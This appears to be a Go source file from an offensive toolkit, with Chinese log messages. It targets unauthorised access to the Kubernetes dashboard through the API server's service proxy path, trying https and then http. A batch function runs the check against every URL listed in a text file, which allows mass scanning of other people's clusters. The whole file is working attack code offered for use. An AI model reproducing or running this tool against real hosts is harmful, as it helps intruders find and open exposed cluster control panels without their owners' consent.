package k8sdashboard

import (
    "bufio"
    "fmt"
    "log"
    "net/url"
    "os"
)

func Exploit(targetURL string) {
    if !Check(targetURL) {
        return
    }

    log.Println("尝试访问k8s dashboard控制面板")

    dashboardURL := fmt.Sprintf("%s/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy", targetURL)
    log.Println("请求路径为/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy")
    getDashboardStatus := getDashboard(dashboardURL)

    u, err := url.Parse(targetURL)
    if err != nil {
        log.Printf("解析URL失败: %v", err)
        return
    }
    dHost := u.Hostname()
    dPort := u.Port()
    if dPort == "" {
        dPort = "80" // 默认端口
    }
    log.Println(dHost)
    log.Println(dPort)

    if getDashboardStatus {
        log.Println("成功访问k8s dashboard控制面板，目标服务存在k8s dashboard未授权访问漏洞")
    } else {
        dashboardURL = fmt.Sprintf("%s/api/v1/namespaces/kubernetes-dashboard/services/http:kubernetes-dashboard:/proxy", targetURL)
        log.Println("请求路径为/api/v1/namespaces/kubernetes-dashboard/services/http:kubernetes-dashboard:/proxy")
        getDashboardStatus = getDashboard(dashboardURL)
        if getDashboardStatus {
            log.Println("成功访问k8s dashboard控制面板，目标服务存在k8s dashboard未授权访问漏洞")
        } else {
            log.Printf("可以访问%s，但是没有权限访问/api/v1/namespaces/kubernetes-dashboard", targetURL)
        }
    }
}

func ExploitFromTxt(filePath string) {
    file, err := os.Open(filePath)
    if err != nil {
        log.Fatalf("无法打开文件: %v", err)
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        targetURL := scanner.Text()
        log.Printf("处理URL: %s", targetURL)
        Exploit(targetURL)
    }

    if err := scanner.Err(); err != nil {
        log.Fatalf("读取文件时出错: %v", err)
    }
}